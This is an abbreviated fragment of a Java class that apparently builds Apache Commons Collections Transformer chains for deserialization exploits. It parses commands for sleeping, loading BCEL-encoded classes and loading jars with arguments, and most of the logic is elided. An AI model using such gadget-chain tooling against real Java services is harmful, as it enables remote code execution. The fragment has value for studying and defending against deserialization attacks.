...
public class CommonsCollectionsUtil {
    public static Transformer[] getTransformerList(String command) throws Exception {
        ...
        if(command.toLowerCase().startsWith(CommandConstant.COMMAND_SLEEP)){
            ...
            String bcelStr = command.substring(CommandConstant.COMMAND_BCEL.length());
            ...
            String bcelClass = command.substring(CommandConstant.COMMAND_BCEL_CLASS_FILE.length());
            ...
            String tmp = command.substring(CommandConstant.COMMAND_LOADJAR.length());
            ...
            String tmp = command.substring(CommandConstant.COMMAND_LOADJAR_WITH_ARGS.length());
            String jarPath = tmp.split("\\|")[0];
            String className = tmp.split("\\|")[1];
